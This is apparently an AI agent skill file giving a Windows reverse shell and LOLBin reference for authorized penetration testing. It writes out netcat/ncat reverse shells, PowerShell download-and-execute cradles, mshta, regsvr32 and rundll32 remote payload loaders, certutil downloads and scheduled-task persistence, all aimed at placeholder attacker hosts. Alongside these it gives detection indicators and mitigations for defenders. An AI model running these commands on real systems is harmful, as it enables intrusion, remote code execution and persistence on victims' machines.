---
name: windows-reverse-shell-reference
description: Reference guide for Windows reverse shell techniques used in authorized penetration testing and security research. Use this skill when the user asks about Windows reverse shells, LOLBins for code execution, or needs to understand Windows-based remote access techniques for security assessments. Make sure to use this skill whenever the user mentions reverse shells, Windows exploitation, LOLBins, or security testing on Windows systems, even if they don't explicitly ask for a 'reference guide'.
---

# Windows Reverse Shell Reference

## ⚠️ Legal and Ethical Notice

**This skill is for authorized security testing and educational purposes only.**

- Only use these techniques on systems you own or have explicit written authorization to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- Always obtain proper authorization before conducting security assessments
- Document all testing activities and maintain chain of custody for evidence

## Overview

This reference documents Windows reverse shell techniques commonly encountered in penetration testing and security research. Understanding these methods helps security professionals:

- Conduct authorized penetration tests
- Develop detection signatures
- Implement defensive controls
- Understand attack vectors for threat modeling

## LOLBins (Living Off The Land Binaries)

LOLBins are legitimate Windows binaries that can be abused to execute arbitrary code. Unlike Linux SUID files, Windows uses signed system binaries for this purpose.

### Key Resources
- [LOLBAS Project](https://lolbas-project.github.io/) - Windows LOLBin database
- [GTFOBins](https://gtfobins.github.io/) - Linux equivalent

## Network-Based Shells

### Netcat (nc)

**Victim:**
```bash
nc.exe -e cmd.exe <ATTACKER_IP> <PORT>
```

**Attacker Listener:**
```bash
nc -lvp <PORT>
```

### Ncat (Nmap)

**Victim:**
```bash
ncat.exe <ATTACKER_IP> <PORT> -e "cmd.exe /c (cmd.exe 2>&1)"
# With SSL encryption
ncat.exe <ATTACKER_IP> <PORT> --ssl -e "cmd.exe /c (cmd.exe 2>&1)"
```

**Attacker Listener:**
```bash
ncat -lvp <PORT>
# With SSL encryption
ncat -lvp <PORT> --ssl
```

### SBD (Secure Binary Daemon)

SBD is a portable, encrypted Netcat alternative from Kali Linux.

**Victim:**
```bash
sbd -l -p 4444 -e cmd.exe -v -n
```

**Attacker:**
```bash
sbd <VICTIM_IP> 4444
```

## Scripting Language Shells

### Python

Python-based reverse shells use socket and subprocess modules. Common patterns include:

- Socket connection to attacker
- Subprocess spawning of cmd.exe
- Bidirectional I/O forwarding
- Threading for concurrent read/write

**Detection indicators:**
- Python process spawning cmd.exe
- Unusual network connections from python.exe
- Base64-encoded payloads

### PowerShell

PowerShell is frequently used for reverse shells due to its ubiquity on Windows systems.

**Common patterns:**

1. **WebClient download and execute:**
   ```powershell
   powershell -exec bypass -c "(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1') | iex"
   ```

2. **TCP reverse shell one-liner:**
   Uses `System.Net.Sockets.TCPClient` to establish connection and `iex` to execute commands.

3. **WebDAV execution:**
   ```powershell
   powershell -exec bypass -f \\webdavserver\folder\payload.ps1
   ```
   - Network call performed by: `svchost.exe`
   - Payload cached in: WebDAV client local cache

**Detection indicators:**
- `-exec bypass` parameter
- `DownloadString` or `DownloadFile` calls
- `iex` (Invoke-Expression) usage
- Encoded command strings

### VBScript/JScript

**CScript/WScript execution:**
```bash
cscript.exe <script.vbs>
wscript.exe <script.vbs>
```

**Detection indicators:**
- Script execution from temp directories
- Network connections from cscript.exe/wscript.exe

## LOLBin-Based Execution

### Mshta (Microsoft HTML Application Host)

Executes HTML applications and can load remote payloads.

**Common patterns:**

1. **Direct HTA execution:**
   ```bash
   mshta http://<webserver>/payload.hta
   mshta \\webdavserver\folder\payload.hta
   ```

2. **SCT (Script Component) execution:**
   ```bash
   mshta vbscript:Close(Execute("GetObject(\"script:http://<webserver>/payload.sct\")"))
   ```

3. **HTA with embedded PowerShell:**
   ```xml
   <script language="VBScript">
   CreateObject("WScript.Shell").Run "powershell -ep bypass -w hidden IEX (New-Object System.Net.Webclient).DownloadString('http://<IP>/1.ps1')"
   </script>
   ```

**Detection indicators:**
- mshta.exe spawning cmd.exe or powershell.exe
- Network connections from mshta.exe
- HTA files in temp directories

### Rundll32

Loads and executes DLL functions, commonly abused for code execution.

**Common patterns:**

1. **Direct DLL execution:**
   ```bash
   rundll32 \\webdavserver\folder\payload.dll,entrypoint
   ```

2. **JavaScript/HTML Application:**
   ```bash
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://<webserver>/payload.sct");window.close();
   ```

**Detection indicators:**
- rundll32.exe with unusual arguments
- Network connections from rundll32.exe
- DLL files in temp directories

### Regsvr32

Registers COM components, frequently abused with SCT payloads.

**Common patterns:**

1. **SCT execution:**
   ```bash
   regsvr32 /u /n /s /i:http://<webserver>/payload.sct scrobj.dll
   regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
   ```

2. **Persistence with scheduled tasks:**
   ```powershell
   Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:<arg> <dll>") -TaskName '<taskname>' -RunLevel Highest
   ```

**Detection indicators:**
- regsvr32.exe with `/i` argument pointing to URLs
- regsvr32.exe spawning cmd.exe or powershell.exe
- Scheduled tasks with regsvr32 actions

### Certutil

Certificate utility that can download and decode files.

**Common patterns:**

1. **Download and decode:**
   ```bash
   certutil -urlcache -split -f http://<webserver>/payload.b64 payload.b64
   certutil -decode payload.b64 payload.dll
   ```

**Detection indicators:**
- certutil.exe with `-urlcache` or `-decode` arguments
- Base64 files in temp directories
- certutil.exe spawning other executables

### WMIC

Windows Management Instrumentation Command-line.

**Common patterns:**

1. **XSL payload execution:**
   ```bash
   wmic os get /format:"http://<webserver>/payload.xsl"
   ```

**Detection indicators:**
- wmic.exe with `/format` pointing to URLs
- XSL files with embedded script

### MSBuild

Microsoft Build Engine, can execute arbitrary code through project files.

**Common patterns:**

1. **Project file execution:**
   ```bash
   C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <project.csproj>
   ```

**Detection indicators:**
- msbuild.exe with unusual project files
- Network connections from msbuild.exe

### CSC (C# Compiler)

Compiles C# code on the victim machine.

**Common patterns:**

1. **Compile and execute:**
   ```bash
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
   ```

**Detection indicators:**
- csc.exe execution from unusual locations
- Newly compiled executables in temp directories

## Detection and Mitigation

### Common Detection Indicators

1. **Process creation:**
   - LOLBins spawning cmd.exe, powershell.exe, or other interpreters
   - Unusual command-line arguments
   - Process injection patterns

2. **Network activity:**
   - Outbound connections from unexpected processes
   - Connections to known malicious IPs/domains
   - Unusual ports or protocols

3. **File system:**
   - Scripts or executables in temp directories
   - Base64-encoded files
   - HTA, SCT, or XSL files

4. **Registry:**
   - Scheduled tasks with suspicious actions
   - Run keys with LOLBin commands

### Mitigation Strategies

1. **Application whitelisting:**
   - Restrict execution to approved binaries
   - Block LOLBins from spawning interpreters

2. **Network segmentation:**
   - Limit outbound connections
   - Monitor for unusual traffic patterns

3. **Endpoint detection:**
   - Deploy EDR solutions
   - Enable process creation logging
   - Monitor for LOLBin abuse patterns

4. **PowerShell hardening:**
   - Enable Constrained Language Mode
   - Implement PowerShell logging
   - Use AppLocker or WDAC

5. **User training:**
   - Phishing awareness
   - Safe browsing practices
   - Reporting suspicious activity

## References

- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [High on Coffee - Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

## Usage Guidelines

When using this skill:

1. **Verify authorization** - Confirm the user has proper authorization for any testing
2. **Document activities** - Maintain records of all testing performed
3. **Focus on defense** - Use knowledge to improve security posture
4. **Stay current** - LOLBin techniques evolve; keep knowledge updated
5. **Report findings** - Share vulnerabilities with appropriate parties

---

*This reference is for educational and authorized security testing purposes only. Always obtain proper authorization before conducting security assessments.*
